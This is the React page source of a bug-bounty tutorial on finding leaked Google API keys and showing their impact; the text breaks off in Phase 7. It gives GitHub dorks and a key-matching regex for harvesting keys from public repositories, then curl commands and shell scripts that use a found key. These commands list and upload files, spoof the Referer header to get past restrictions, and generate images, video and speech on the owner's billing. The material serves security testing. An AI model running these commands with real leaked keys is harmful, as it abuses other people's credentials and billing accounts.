"use client"

import { useState } from "react"
import Image from "next/image"
import Link from "next/link"
import { MainSidebar } from "@/components/main-sidebar"
import { PageTitle } from "@/components/page-title"
import { CommandCard } from "@/components/command-card"
import { Badge } from "@/components/ui/badge"
import {
  Key, Terminal, ChevronRight, Home, ExternalLink,
  Search, Shield, Upload, AlertTriangle, FileText,
  Globe, Zap, DollarSign, Github, BookOpen, Video,
  CheckCircle, XCircle, ArrowRight, Bug,
} from "lucide-react"
import { cn } from "@/lib/utils"

const phases = [
  { id: "introduction", label: "Introduction" },
  { id: "phase-1-github-dorking", label: "Phase 1 — GitHub Dorking" },
  { id: "phase-2-key-verification", label: "Phase 2 — Key Verification" },
  { id: "phase-3-demonstrating-impact", label: "Phase 3 — Impact" },
  { id: "phase-4-advanced-bypasses", label: "Phase 4 — Bypasses" },
  { id: "phase-5-burp-extension", label: "Phase 5 — Burp Extension" },
  { id: "phase-6-chat-interface", label: "Phase 6 — Chat Interface" },
  { id: "phase-7-automation-tool", label: "Phase 7 — Automation" },
  { id: "phase-8-beyond-gemini", label: "Phase 8 — Beyond Gemini" },
  { id: "reporting", label: "Reporting" },
]

export default function GoogleAPIKeysPage() {
  const [activeCategory, setActiveCategory] = useState("introduction")
  const [expandedImg, setExpandedImg] = useState<string | null>(null)

  const scrollToSection = (id: string) => {
    setActiveCategory(id)
    const element = document.getElementById(id)
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" })
    }
  }

  return (
    <div className="min-h-screen bg-background">
      <PageTitle title="Google API Keys" />
      <MainSidebar />

      <main id="main-content" className="lg:pl-64">
        {/* Breadcrumb */}
        <div className="border-b border-border bg-card/50">
          <div className="mx-auto max-w-5xl px-6 py-3">
            <nav className="flex items-center gap-2 text-sm text-muted-foreground">
              <Link href="/" className="flex items-center gap-1 hover:text-foreground">
                <Home className="h-4 w-4" />
              </Link>
              <ChevronRight className="h-4 w-4" />
              <Link href="/cloud" className="hover:text-foreground">Cloud & Assets</Link>
              <ChevronRight className="h-4 w-4" />
              <span className="text-foreground">Google API Keys</span>
            </nav>
          </div>
        </div>

        {/* Hero */}
        <div className="relative overflow-hidden border-b border-border bg-gradient-to-br from-primary/10 via-background to-accent/5">
          <div className="absolute inset-0 bg-[url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjAiIGhlaWdodD0iNjAiIHBhdHRlcm4gaWQ9ImdyaWQiIHdpZHRoPSI2MCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSJyZGF0PSJNIDYwIDAgTCBMMCAwIDAgNjAiIGZpbGw9Im5vbmUiIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGV4dD0idyIvPjwvc3ZnPg==')] opacity-50" />
          <div className="relative px-6 py-12 text-center lg:py-16">
            <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-2xl bg-primary/10 text-primary">
              <Key className="h-8 w-8" />
            </div>
            <h1 className="text-3xl font-bold text-foreground lg:text-4xl text-balance">
              Google API Keys — Finding & Exploiting Exposed Keys
            </h1>
            <p className="mx-auto mt-3 max-w-2xl text-muted-foreground text-pretty">
              Turn exposed Google API keys into real-world impact by accessing Gemini and other Google services for higher bounty rewards
            </p>
            <div className="mt-6 flex flex-wrap items-center justify-center gap-3">
              <span className="rounded-full bg-primary/10 px-4 py-2 text-sm font-medium text-primary">8 Phases</span>
              <span className="rounded-full bg-accent/10 px-4 py-2 text-sm font-medium text-accent">30+ Commands</span>
              <span className="rounded-full bg-secondary px-4 py-2 text-sm font-medium text-foreground">Copy Ready</span>
            </div>

            {/* Hero Image */}
            <div className="mx-auto mt-8 max-w-3xl overflow-hidden rounded-xl border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_uz5jRhnpFIHKJTDjBFn8-g.webp")}>
              <Image
                src="/images/cloud/google-api-keys/1_uz5jRhnpFIHKJTDjBFn8-g.webp"
                alt="Google API Keys hero illustration"
                width={1200}
                height={675}
                className="w-full"
                style={{ height: "auto" }}
                loading="eager"
                unoptimized
              />
            </div>
          </div>
        </div>

        {/* Sticky Navigation */}
        <div className="sticky top-0 z-20 border-b border-border bg-card/95 backdrop-blur-sm">
          <div className="mx-auto max-w-5xl px-6">
            <div className="flex gap-1 overflow-x-auto py-3 scrollbar-hide">
              {phases.map((phase) => (
                <button
                  key={phase.id}
                  onClick={() => scrollToSection(phase.id)}
                  className={cn(
                    "flex shrink-0 items-center gap-2 rounded-lg px-3 py-2 text-sm font-medium transition-colors",
                    activeCategory === phase.id
                      ? "bg-primary text-primary-foreground"
                      : "text-muted-foreground hover:bg-muted hover:text-foreground"
                  )}
                >
                  {phase.label}
                </button>
              ))}
            </div>
          </div>
        </div>

        {/* Content */}
        <div className="mx-auto max-w-5xl space-y-16 p-6">

          {/* Introduction */}
          <section id="introduction" className="scroll-mt-24">
            <h2 className="mb-4 text-2xl font-bold text-foreground">Introduction</h2>
            <p className="text-muted-foreground leading-relaxed">
              Google&apos;s exposed API keys have always been a common target in bug bounty hunting, but with the rise of the Gemini ecosystem, their impact has grown significantly. A single leaked Gemini-enabled key can grant access to powerful AI services, enable real-world abuse scenarios and generate serious financial impact through unauthorized usage.
            </p>

            <h3 className="mt-8 mb-3 text-xl font-semibold text-foreground">Why Google API Keys Are Worth Hunting</h3>
            <p className="text-muted-foreground leading-relaxed">
              For years, exposed Google API keys were often ignored or treated as low-value findings because most people assumed they were properly restricted. In reality, many organizations leave these keys misconfigured, over-permissioned or completely unrestricted without realizing the level of access they expose.
            </p>
            <p className="mt-3 text-muted-foreground leading-relaxed">
              Depending on the enabled APIs and security restrictions, an exposed key may allow:
            </p>
            <ul className="mt-3 space-y-2 text-muted-foreground">
              {[
                "Access to Gemini and other Google AI models",
                "Unauthorized usage of billable cloud resources",
                "File uploads, data interaction, or backend requests",
                "Access to services like Firebase, Maps, Vision, or Translate APIs",
                "Large-scale automated abuse that increases operational costs",
              ].map((item) => (
                <li key={item} className="flex items-start gap-2">
                  <ChevronRight className="mt-1 h-3 w-3 shrink-0 text-primary" />
                  <span>{item}</span>
                </li>
              ))}
            </ul>
            <p className="mt-4 text-muted-foreground leading-relaxed">
              This is what makes Google API key hunting far more valuable today. The issue is no longer just &ldquo;an exposed secret.&rdquo; The real impact comes from what that key can actually do once it falls into the wrong hands.
            </p>
          </section>

          {/* Phase 1 — GitHub Dorking */}
          <section id="phase-1-github-dorking" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Github className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-primary">Phase 1</span>
                <h2 className="text-2xl font-bold text-foreground">GitHub Dorking: The Easiest Starting Point</h2>
              </div>
            </div>
            <p className="mb-6 text-muted-foreground leading-relaxed">
              We&apos;ll start with GitHub, still one of the easiest places to find exposed Google API keys. Developers often leak them in .env files, JavaScript bundles or misconfigured commits. Here are some simple but effective GitHub dorks to find them quickly.
            </p>

            {/* Dork 1 */}
            <div className="mb-8 rounded-lg border border-border bg-card p-5">
              <h3 className="mb-2 font-semibold text-foreground">Dork #1 — Basic Gemini API Key Search</h3>
              <p className="mb-4 text-sm text-muted-foreground">
                Let&apos;s start with a simple Gemini API key dork designed to find repositories actively integrating Gemini services. It searches for Gemini-related model references alongside potentially exposed Google API keys, helping surface repositories that may have access to Gemini models.
              </p>
              <CommandCard
                command='"GEMINI_API_KEY"'
                description="Search GitHub for exposed Gemini API keys"
                index={1}
              />
              <div className="mt-4 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_yYZE6H0KV28Fv_oa3xDjLQ.webp")}>
              <Image src="/images/cloud/google-api-keys/1_yYZE6H0KV28Fv_oa3xDjLQ.webp" alt="GEMINI_API_KEY dork results" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
              </div>
            </div>

            {/* Dork 2 */}
            <div className="mb-8 rounded-lg border border-border bg-card p-5">
              <h3 className="mb-2 font-semibold text-foreground">Dork #2 — Regex-Based Key Pattern Targeting</h3>
              <p className="mb-4 text-sm text-muted-foreground">
                Now let&apos;s move to a more precise dork. This one uses regex to specifically target Google API key patterns, reducing noise and surfacing more relevant results by focusing only on strings that match valid Google API key formats.
              </p>
              <div className="space-y-2">
                <CommandCard command="/AIza[0-9A-Za-z_-]{35}/" description="Regex pattern for Google API keys" index={2} />
                <CommandCard command='/AIza[0-9A-Za-z_-]{35}/ "GEMINI_API_KEY"' description="Combined regex + keyword search" index={3} />
              </div>
              <div className="mt-4 grid gap-4 sm:grid-cols-2">
                <div className="overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_sYv6w71E5yJKxqi9wEiXlA.webp")}>
              <Image src="/images/cloud/google-api-keys/1_sYv6w71E5yJKxqi9wEiXlA.webp" alt="Regex dork results" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
                <div className="overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_p6EYvNFRcuPJE_Bb422NXw.webp")}>
              <Image src="/images/cloud/google-api-keys/1_p6EYvNFRcuPJE_Bb422NXw.webp" alt="Regex dork results 2" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
              </div>
            </div>

            {/* Dork 3 */}
            <div className="mb-8 rounded-lg border border-border bg-card p-5">
              <h3 className="mb-2 font-semibold text-foreground">Dork #3 — Path Filter for Environment Files</h3>
              <p className="mb-4 text-sm text-muted-foreground">
                Next, we&apos;ll use a path-based filter to find API keys inside environment files. This is particularly useful because many developers store sensitive keys in env files. These files are often pushed by mistake and when they are, they tend to contain everything — API keys, tokens, sometimes even credentials.
              </p>
              <CommandCard command='/AIza[0-9A-Za-z_-]{35}/ "GEMINI_API_KEY" path:/.env' description="Search env files for Gemini API keys" index={4} />
              <div className="mt-4 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_UHZ9CVWvYuRCu13oxAQI1Q.webp")}>
              <Image src="/images/cloud/google-api-keys/1_UHZ9CVWvYuRCu13oxAQI1Q.webp" alt="Env file dork results" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
              </div>
            </div>

            {/* Dork 4 */}
            <div className="mb-8 rounded-lg border border-border bg-card p-5">
              <h3 className="mb-2 font-semibold text-foreground">Dork #4 — Path Filter for JavaScript Files</h3>
              <p className="mb-4 text-sm text-muted-foreground">
                You can apply the same path filter to JavaScript files. Many developers hardcode API keys into JS files, assuming they&apos;ll go unnoticed but these targeted dorks can expose them quickly.
              </p>
              <div className="space-y-2">
                <CommandCard command='/AIza[0-9A-Za-z_-]{35}/ "GEMINI_API_KEY" path:/*.js' description="Search JS files for Gemini keys" index={5} />
                <CommandCard command="/AIza[0-9A-Za-z_-]{35}/  path:/*.js" description="Search JS files for any Google API key" index={6} />
              </div>
              <div className="mt-4 grid gap-4 sm:grid-cols-2">
                <div className="overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_rhMBy8bEZaEh9S3Hib_v_A.webp")}>
              <Image src="/images/cloud/google-api-keys/1_rhMBy8bEZaEh9S3Hib_v_A.webp" alt="JS file dork results" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
                <div className="overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_mu38e0uwjZFAYFUKXT3nJA.webp")}>
              <Image src="/images/cloud/google-api-keys/1_mu38e0uwjZFAYFUKXT3nJA.webp" alt="JS file dork results 2" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
              </div>
            </div>

            {/* Dork 5 */}
            <div className="mb-8 rounded-lg border border-border bg-card p-5">
              <h3 className="mb-2 font-semibold text-foreground">Dork #5 — Targeting Specific Organization and Domain Scoping</h3>
              <p className="mb-4 text-sm text-muted-foreground">
                If you are hunting on a specific private program or targeting a specific company, narrow your search scope using the org or domain filters. This helps reduce noise and surface potentially exposed keys faster.
              </p>
              <div className="space-y-2">
                <CommandCard command='"netflix.com" /AIza[0-9A-Za-z_-]{35}/' description="Domain-scoped key search" index={7} />
                <CommandCard command="org:microsoft /AIza[0-9A-Za-z_-]{35}/" description="Organization-scoped key search" index={8} />
              </div>
              <div className="mt-4 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_xvv-Zg_rc9uP5GDq_z4QZQ.webp")}>
              <Image src="/images/cloud/google-api-keys/1_xvv-Zg_rc9uP5GDq_z4QZQ.webp" alt="Organization-scoped dork results" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
              </div>
            </div>
          </section>

          {/* Phase 2 — Key Verification */}
          <section id="phase-2-key-verification" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <CheckCircle className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-primary">Phase 2</span>
                <h2 className="text-2xl font-bold text-foreground">Key Verification</h2>
              </div>
            </div>
            <p className="mb-6 text-muted-foreground leading-relaxed">
              Finding a key is only the first step. The real value comes from proving the key is active and has Gemini access enabled. One of the fastest ways to validate this is by querying the models endpoint.
            </p>

            <CommandCard
              command="curl https://generativelanguage.googleapis.com/v1beta/models?key=YOUR_API_KEY"
              description="Query available Gemini models to validate the key"
              index={9}
            />

            <div className="mt-6 grid gap-4 sm:grid-cols-2">
              <div className="overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_DQbF17VxGBKTkFSdNv2Q0g.webp")}>
              <Image src="/images/cloud/google-api-keys/1_DQbF17VxGBKTkFSdNv2Q0g.webp" alt="Key verification success" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
              <div className="overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_w0pilvy1NwaEXcstOh8uIA.webp")}>
              <Image src="/images/cloud/google-api-keys/1_w0pilvy1NwaEXcstOh8uIA.webp" alt="Key verification response" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
            </div>

            <div className="mt-6 grid gap-4 sm:grid-cols-2">
              <div className="rounded-lg border border-emerald-500/20 bg-emerald-500/5 p-4">
                <div className="mb-2 flex items-center gap-2 text-emerald-400">
                  <CheckCircle className="h-5 w-5" />
                  <span className="font-semibold">Success (200 OK)</span>
                </div>
                <p className="text-sm text-muted-foreground">
                  Returns a JSON list of available models (e.g., gemini-pro, gemini-1.5-flash). This confirms the key is active and has generative AI privileges.
                </p>
              </div>
              <div className="rounded-lg border border-red-500/20 bg-red-500/5 p-4">
                <div className="mb-2 flex items-center gap-2 text-red-400">
                  <XCircle className="h-5 w-5" />
                  <span className="font-semibold">Failure (403 / 400)</span>
                </div>
                <p className="text-sm text-muted-foreground">
                  Returns error codes such as API_KEY_INVALID or API_KEY_RESTRICTED. This indicates the key has been revoked or successfully locked down.
                </p>
              </div>
            </div>
          </section>

          {/* Phase 3 — Demonstrating Impact */}
          <section id="phase-3-demonstrating-impact" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Zap className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-primary">Phase 3</span>
                <h2 className="text-2xl font-bold text-foreground">Demonstrating Impact: Beyond &ldquo;Just a Key&rdquo;</h2>
              </div>
            </div>
            <p className="mb-6 text-muted-foreground leading-relaxed">
              A high-quality bug bounty report requires a Proof of Concept (PoC) that demonstrates risk. For Gemini keys, the most significant impact often lies in the File API. To move beyond &ldquo;informational&rdquo; severity, you need to show what an attacker can actually do.
            </p>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Interacting with the File Endpoint</h3>
            <p className="mb-4 text-sm text-muted-foreground">
              The File API allows users to upload files such as images, audio, videos and documents for Gemini models to analyze and process.
            </p>

            <h4 className="mb-2 font-medium text-foreground">List Files</h4>
            <p className="mb-3 text-sm text-muted-foreground">
              You can check whether the API key owner has already uploaded files to the account:
            </p>
            <CommandCard
              command="curl https://generativelanguage.googleapis.com/v1beta/files?key=YOUR_KEY"
              description="List existing files on the target account"
              index={10}
            />

            <h4 className="mb-2 mt-6 font-medium text-foreground">Upload a PoC File</h4>
            <p className="mb-3 text-sm text-muted-foreground">
              To demonstrate impact, you can upload your own file as a proof of concept. Simply create a file, assign a display name and upload it using the API Key that you found.
            </p>
            <div className="space-y-2">
              <CommandCard command='echo "Hello, this is a test file" > test.txt' description="Create a PoC file" index={11} />
              <CommandCard
                command={`curl -i -H "X-Goog-Upload-Protocol: multipart" -F 'metadata={"file":{"display_name":"coffin","mimeType":"text/plain"}};type=application/json' -F "file=@test.txt;type=text/plain" "https://generativelanguage.googleapis.com/upload/v1beta/files?key=YOUR_KEY"`}
                description="Upload the PoC file to the target account"
                index={12}
              />
            </div>

            <div className="mt-4 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_t-HQAJjtGxsOjJWLrjjaPA.webp")}>
              <Image src="/images/cloud/google-api-keys/1_t-HQAJjtGxsOjJWLrjjaPA.webp" alt="File upload PoC" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>

            <p className="mt-4 text-sm text-muted-foreground">
              Once the upload is complete, you can verify it through the same files endpoint. Your uploaded file should appear in the response, and it can also be accessed directly through the browser using the returned file URL.
            </p>
            <div className="mt-3 space-y-2">
              <CommandCard command='curl "https://generativelanguage.googleapis.com/v1beta/files?key=YOUR_KEY"' description="Verify uploaded file appears in the account" index={13} />
            </div>

            <div className="mt-4 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_E14ymTDYPQsRPipAvituWQ.webp")}>
              <Image src="/images/cloud/google-api-keys/1_E14ymTDYPQsRPipAvituWQ.webp" alt="File upload verification" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>

            <h4 className="mb-2 mt-6 font-medium text-foreground">Delete the PoC File</h4>
            <p className="mb-3 text-sm text-muted-foreground">
              Always clean up after testing. Use the delete method with the file&apos;s unique resource name to remove it. If the API returns an empty response, the file was deleted successfully.
            </p>
            <CommandCard
              command='curl -X DELETE "https://generativelanguage.googleapis.com/v1beta/files/1d1j3cg1br3k?key=YOUR_API_KEY"'
              description="Delete the PoC file after testing"
              index={14}
            />
            <p className="mt-2 text-xs text-amber-400">
              Note: Never delete or modify files belonging to the target organization. Only interact with files you have created for the PoC.
            </p>
          </section>

          {/* Phase 4 — Advanced Bypasses */}
          <section id="phase-4-advanced-bypasses" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Shield className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-primary">Phase 4</span>
                <h2 className="text-2xl font-bold text-foreground">Advanced Bypasses: The 403 Referer Trick</h2>
              </div>
            </div>
            <p className="mb-6 text-muted-foreground leading-relaxed">
              Sometimes, a direct curl or browser request returns a 403 Forbidden, indicating the API key is restricted to specific domains or referrers. Many hunters stop here, but the restriction can still be bypassed depending on how it was configured.
            </p>

            <div className="mb-6 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_cg-Wbk5QqCF7CnaPe4X34Q.webp")}>
              <Image src="/images/cloud/google-api-keys/1_cg-Wbk5QqCF7CnaPe4X34Q.webp" alt="403 Referer bypass" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Referer Spoofing</h3>
            <p className="mb-4 text-sm text-muted-foreground">
              Many API keys are configured with browser restrictions, meaning they only accept requests originating from specific domains. However, if the restriction is weak or improperly configured, simply adding a matching Referer header for the target domain may allow requests to succeed.
            </p>
            <CommandCard
              command='curl -s -H "Referer: https://www.google.com/" "https://generativelanguage.googleapis.com/v1beta/corpora?key=YOUR_API_KEY"'
              description="Bypass referer restrictions using a Referer header"
              index={15}
            />

            <div className="mt-4 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_-1zaMC0i9zz3cQA1r50mow.webp")}>
              <Image src="/images/cloud/google-api-keys/1_-1zaMC0i9zz3cQA1r50mow.webp" alt="Referer bypass success" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>

            <h3 className="mb-3 mt-8 text-lg font-semibold text-foreground">Corpora Endpoint Abuse</h3>
            <p className="mb-4 text-sm text-muted-foreground">
              If the standard File API is blocked, try the Corpora endpoint. This is used for larger, persistent projects and is often less strictly monitored than the standard endpoints.
            </p>

            <h4 className="mb-2 font-medium text-foreground">Upload a new project:</h4>
            <CommandCard
              command={`curl -X POST -H "Content-Type: application/json" -H "Referer: https://www.google.com/" "https://generativelanguage.googleapis.com/v1beta/corpora?key=YOUR_API_KEY" -d '{"display_name": "your_project_name"}'`}
              description="Upload a new corpus project"
              index={16}
            />

            <div className="mt-4 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_a7S-qbHpoXPadjpsGOewMA.webp")}>
              <Image src="/images/cloud/google-api-keys/1_a7S-qbHpoXPadjpsGOewMA.webp" alt="Corpora upload success" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>

            <h4 className="mb-2 mt-6 font-medium text-foreground">Deleting a Corpus:</h4>
            <CommandCard
              command='curl -X DELETE -H "Referer: https://www.google.com/" "https://generativelanguage.googleapis.com/v1beta/corpora/CORPUS_ID?key=YOUR_API_KEY"'
              description="Delete a corpus project"
              index={17}
            />

            <h3 className="mb-3 mt-8 text-lg font-semibold text-foreground">Text Generation</h3>
            <p className="mb-4 text-sm text-muted-foreground">
              Attackers can use a victim&apos;s API key to generate text at scale, allowing them to run spam campaigns, automate prompts, or power AI-based tools directly on the target&apos;s billing account.
            </p>
            <CommandCard
              command={`curl -X POST "https://generativelanguage.googleapis.com/v1beta/models/imagen-4.0-generate-001:predict" -H "x-goog-api-key: YOUR_API_KEY" -H "Content-Type: application/json" -d '{"instances":[{"prompt":"Robot holding a red skateboard"}]}'`}
              description="Generate images using victim's API key"
              index={18}
            />

            <h3 className="mb-3 mt-8 text-lg font-semibold text-foreground">Video Generation</h3>
            <p className="mb-4 text-sm text-muted-foreground">
              Video generation is one of the most serious abuse scenarios, since generating high-quality video content requires massive compute resources and can quickly lead to significant cloud costs for the affected company.
            </p>

            <div className="mb-4 rounded-lg border border-border bg-card">
              <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">generate-video.sh</div>
              <pre className="overflow-x-auto p-4 text-sm text-foreground"><code>{`GEMINI_API_KEY=AIza...
BASE_URL="https://generativelanguage.googleapis.com/v1beta"

operation_name=$(curl -s "$BASE_URL/models/veo-3.0-fast-generate-001:predictLongRunning" \\\\
  -H "x-goog-api-key: $GEMINI_API_KEY" \\\\
  -H "Content-Type: application/json" \\\\
  -X POST \\\\
  -d '{"instances":[{"prompt":"A cinematic 5-second shot of a lantern swaying gently."}]}' \\\\
  | jq -r .name)

while true; do
  status=$(curl -s -H "x-goog-api-key: $GEMINI_API_KEY" "$BASE_URL/$operation_name")
  doneval=$(echo "$status" | jq -r .done)
  if [ "$doneval" = "true" ]; then
    video_uri=$(echo "$status" | jq -r '.response.generateVideoResponse.generatedSamples[0].video.uri')
    curl -L -H "x-goog-api-key: $GEMINI_API_KEY" -o Generated_Video.mp4 "$video_uri"
    break
  fi
  sleep 5
done`}</code></pre>
            </div>

            <h3 className="mb-3 mt-8 text-lg font-semibold text-foreground">Text-to-Speech (TTS) Abuse</h3>
            <p className="mb-4 text-sm text-muted-foreground">
              Exposed API keys can also be abused for text-to-speech generation, allowing attackers to create synthetic audio or run large-scale voice generation on the target&apos;s quota and billing account.
            </p>

            <h4 className="mb-2 font-medium text-foreground">TTS (Single Speaker)</h4>
            <div className="mb-4 rounded-lg border border-border bg-card">
              <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">Bash</div>
              <pre className="overflow-x-auto p-4 text-sm text-foreground"><code>{`curl -s "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-tts:generateContent" \\\\
  -H "x-goog-api-key: YOUR_API_KEY" \\\\
  -H "Content-Type: application/json" \\\\
  -d '{
    "contents":[{"parts":[{"text":"Say cheerfully: Have a wonderful day!"}]}],
    "generationConfig":{
      "responseModalities":["AUDIO"],
      "speechConfig":{
        "voiceConfig":{
          "prebuiltVoiceConfig":{"voiceName":"Kore"}
        }
      }
    }
  }' \\\\
| jq -r '.candidates[0].content.parts[] | select(.inlineData) | .inlineData.data' \\\\
| head -n1 | base64 --decode > out.pcm

ffmpeg -y -f s16le -ar 24000 -ac 1 -i out.pcm out.wav
ffmpeg -y -i out.wav out.mp3`}</code></pre>
            </div>

            <h4 className="mb-2 font-medium text-foreground">TTS (Multi-Speaker)</h4>
            <div className="mb-4 rounded-lg border border-border bg-card">
              <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">Bash</div>
              <pre className="overflow-x-auto p-4 text-sm text-foreground"><code>{`curl -s "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-tts:generateContent" \\\\
  -H "x-goog-api-key: YOUR_API_KEY" \\\\
  -H "Content-Type: application/json" \\\\
  -d '{
    "contents":[{"parts":[{"text":"Joe: Hows it going today Jane?\\\\nJane: Not too bad, how about you?"}]}],
    "generationConfig":{
      "responseModalities":["AUDIO"],
      "speechConfig":{
        "multiSpeakerVoiceConfig":{
          "speakerVoiceConfigs":[
            {"speaker":"Joe","voiceConfig":{"prebuiltVoiceConfig":{"voiceName":"Kore"}}},
            {"speaker":"Jane","voiceConfig":{"prebuiltVoiceConfig":{"voiceName":"Puck"}}}
          ]
        }
      }
    }
  }' \\\\
| jq -r '.candidates[0].content.parts[] | select(.inlineData) | .inlineData.data' \\\\
| head -n1 | base64 --decode > out_multi.pcm

ffmpeg -y -f s16le -ar 24000 -ac 1 -i out_multi.pcm out_multi.wav
ffmpeg -y -i out_multi.wav out_multi.mp3`}</code></pre>
            </div>
          </section>

          {/* Phase 5 — Burp Suite Extension */}
          <section id="phase-5-burp-extension" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Bug className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-primary">Phase 5</span>
                <h2 className="text-2xl font-bold text-foreground">Burp Suite Extension: Automated In-Browser Discovery</h2>
              </div>
            </div>
            <p className="mb-4 text-muted-foreground leading-relaxed">
              You can also use a dedicated Gemini API key extension in Burp Suite. By simply browsing the target through the proxy, the extension can automatically scan page source and JavaScript files for potential API keys using regex patterns. It can also validate discovered keys by checking available models, permissions, and file access capabilities.
            </p>
            <a
              href="https://github.com/njcve/gkey-burp"
              target="_blank"
              rel="noopener noreferrer"
              className="mb-6 inline-flex items-center gap-2 rounded-lg bg-primary/10 px-4 py-2 text-sm font-medium text-primary hover:bg-primary/20"
            >
              <Github className="h-4 w-4" />
              github.com/njcve/gkey-burp
              <ExternalLink className="h-3 w-3" />
            </a>
            <div className="mt-4 grid gap-4 sm:grid-cols-2">
              <div className="overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_HyTxoTDFFryIzBG-6plXng.webp")}>
              <Image src="/images/cloud/google-api-keys/1_HyTxoTDFFryIzBG-6plXng.webp" alt="Burp extension discovery" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
              <div className="overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_mfoDh2sUL55ks1ZxO7ZRTA.webp")}>
              <Image src="/images/cloud/google-api-keys/1_mfoDh2sUL55ks1ZxO7ZRTA.webp" alt="Burp extension validation" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
            </div>
          </section>

          {/* Phase 6 — Chat Interface */}
          <section id="phase-6-chat-interface" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Terminal className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-primary">Phase 6</span>
                <h2 className="text-2xl font-bold text-foreground">Private HTML Chat Interface for Key Exploration</h2>
              </div>
            </div>
            <p className="mb-4 text-muted-foreground leading-relaxed">
              Once you&apos;ve identified a valid API key, you can load it into my private HTML chat interface, which automatically displays available Gemini models. Active models are highlighted in green while inactive ones appear in red, making it easy to quickly verify access to chat and image generation capabilities.
            </p>
            <div className="overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_mLMjXtlks_Owe4mfwroCzw.webp")}>
              <Image src="/images/cloud/google-api-keys/1_mLMjXtlks_Owe4mfwroCzw.webp" alt="Chat interface showing active models" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
          </section>

          {/* Phase 7 — Automation Tool */}
          <section id="phase-7-automation-tool" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Zap className="h-5 w-5" />
